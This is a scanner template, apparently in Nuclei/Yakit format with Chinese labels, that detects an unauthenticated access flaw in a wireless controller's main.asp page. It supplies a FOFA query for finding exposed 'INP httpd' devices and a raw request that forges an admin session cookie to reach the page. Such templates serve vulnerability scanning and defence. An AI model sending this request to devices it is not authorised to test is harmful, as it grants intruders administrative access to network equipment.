script_name: 无线控制器 main.asp 未授权访问漏洞
content:
id: wireless-controller-main-unauth-access

info:
  name: 无线控制器 main.asp 未授权访问漏洞
  author: dreamer292 from 秃兔安全_tutusec.com
  severity: high
  description: 无线控制器的main.asp页面存在未授权访问漏洞
  metadata:
    max-request: 1
    fofa-query:  'banner="Server: INP httpd" || header="Server: INP httpd"'
    verified: true
  yakit-info:
    sign: a68cc89f8f0ef185dcfc9087cc224efc

http:
- raw:
  - |+
    @timeout: 30s
    GET /main.asp HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Cookie: sessionid=admin
    X-Requested-With: XMLHttpRequest
    Connection: close


  max-redirects: 3
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - top_logo
